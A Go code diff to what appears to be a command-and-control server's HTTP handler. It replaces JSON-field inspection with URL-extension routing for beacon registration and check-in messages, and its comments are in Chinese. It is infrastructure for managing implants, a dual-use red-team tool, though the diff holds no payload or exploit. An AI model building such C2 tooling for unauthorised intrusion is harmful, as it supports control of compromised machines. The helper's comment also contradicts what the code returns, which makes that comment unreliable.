@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"path/filepath"
 	"strconv"
 	"time"
 
@@ -92,12 +93,17 @@ func (s *HTTPServer) handleC2Request(c *gin.Context) {
 		return
 	}
 
-	// 步骤3: 判断请求类型并分发
+	// 步骤3: 根据扩展名分发请求
+	ext := fileExt(c.Request.URL.Path)
 	var respBody []byte
-	if isRegisterRequest(decodedBody) {
+	switch ext {
+	case protocol.ExtRegister:
 		respBody = s.handleRegisterEncoded(decodedBody, c.ClientIP())
-	} else {
+	case protocol.ExtCheckin:
 		respBody = s.handleCheckinEncoded(decodedBody, c.ClientIP())
+	default:
+		c.JSON(http.StatusNotFound, gin.H{"error": "unknown message type"})
+		return
 	}
 
 	// 步骤4: 编码响应体（用同一个 encoder）
@@ -111,17 +117,6 @@ func (s *HTTPServer) handleC2Request(c *gin.Context) {
 	}
 
 	c.Data(http.StatusOK, contentTypeForEncoder(encoderID), encodedResp)
-}
-
-// isRegisterRequest 通过检测 JSON 字段区分注册和心跳。
-// RegisterRequest 有 "hostname" 字段，CheckinRequest 有 "beacon_id" 字段。
-func isRegisterRequest(body []byte) bool {
-	var m map[string]json.RawMessage
-	if err := json.Unmarshal(body, &m); err != nil {
-		return false
-	}
-	_, hasHostname := m["hostname"]
-	return hasHostname
 }
 
 func (s *HTTPServer) handleRegisterEncoded(body []byte, remoteAddr string) []byte {
@@ -172,6 +167,11 @@ func extractNonceFromRequest(r *http.Request) int {
 }
 
 // ── 辅助函数 ───────────────────────────────────────────────────────
+
+// fileExt 返回 URL 路径中的文件扩展名（不含点）。
+func fileExt(path string) string {
+	return filepath.Ext(path)
+}
 
 func contentTypeForEncoder(encoderID int) string {
 	switch encoderID {
